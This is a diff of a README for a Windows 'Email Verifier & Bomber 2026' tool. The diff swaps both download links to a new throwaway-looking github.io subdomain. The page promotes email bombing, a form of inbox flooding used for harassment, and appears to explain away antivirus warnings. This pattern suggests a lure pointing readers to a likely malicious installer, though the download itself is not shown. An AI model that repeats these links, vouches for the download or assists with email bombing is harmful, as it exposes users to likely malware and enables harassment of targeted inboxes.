@@ -2,7 +2,7 @@
 
 The Email Verifier & Bomber 2026 is a comprehensive Windows desktop application designed for professionals and enthusiasts who need a powerful, all-in-one tool for managing and testing email lists. This advanced email bomber and verifier suite combines deep validation, intelligent list cleaning, and controlled delivery mechanisms into a single, easy-to-use interface.
 
-[![Download Installer](https://img.shields.io/badge/Download-Latest%20Version-brightgreen?style=for-the-badge&logo=windows&logoColor=white)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Latest%20Version-brightgreen?style=for-the-badge&logo=windows&logoColor=white)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Inside: Key Features
 
@@ -49,7 +49,7 @@ This can occasionally happen with new or less-distributed applications. The file
 
 Get the latest stable release of the Email Verifier & Bomber Toolkit for Windows. The download is hosted securely on our project page.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 *Last Updated: October 2026 | Copyright © 2026 Email Toolkit Developers. All rights reserved.*
